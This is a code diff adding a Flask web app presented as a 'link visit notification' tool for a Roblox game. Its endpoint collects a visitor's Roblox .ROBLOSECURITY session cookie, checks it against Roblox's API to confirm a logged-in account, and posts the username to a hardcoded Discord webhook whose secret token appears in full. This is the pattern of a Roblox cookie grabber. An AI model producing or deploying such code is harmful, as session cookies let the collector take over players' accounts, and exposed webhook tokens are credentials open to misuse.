@@ -1,0 +1,53 @@
+from flask import Flask, request, jsonify, redirect
+import requests
+
+app = Flask(__name__)
+
+# Your Discord webhook URL
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1326807233027117116/Pi3JDA6svJg0ZHN1QPh3OE74jRb9Rh1SnjKRz_Z9wQxlssNYyEXmhFJD5BCfZ8gzoIfm"
+
+# Roblox link to redirect the user
+ROBLOX_REDIRECT_URL = "https://www.roblox.com/games/123456789/Your-Game-Name"  # Replace with your Roblox game URL
+
+@app.route('/notify', methods=['POST'])
+def notify_visit():
+    roblox_cookie = request.json.get('cookie')
+    
+    if not roblox_cookie:
+        return jsonify({"error": "Missing .ROBLOSECURITY cookie"}), 400
+
+    try:
+        headers = {
+            "Cookie": f".ROBLOSECURITY={roblox_cookie}",
+            "User-Agent": "Mozilla/5.0"
+        }
+        response = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
+
+        if response.status_code == 200:
+            user_data = response.json()
+            username = user_data.get("name", "Unknown User")
+
+            # Prepare the Discord embed
+            embed = {
+                "embeds": [
+                    {
+                        "title": "Link Visit Notification",
+                        "description": f"User **{username}** visited the link!",
+                        "color": 5814783,  # Blue embed color
+                        "footer": {"text": "Notification from your website"}
+                    }
+                ]
+            }
+
+            discord_response = requests.post(DISCORD_WEBHOOK_URL, json=embed)
+            if discord_response.status_code == 204:
+                return jsonify({"success": "Notification sent successfully!"}), 200
+            else:
+                return jsonify({"error": f"Failed to notify Discord: {discord_response.text}"}), 500
+        else:
+            return jsonify({"error": "Failed to retrieve Roblox username. Are you logged in?"}), 403
+    except Exception as e:
+        return jsonify({"error": f"Error: {str(e)}"}), 500
+
+if __name__ == '__main__':
+    app.run(debug=True)
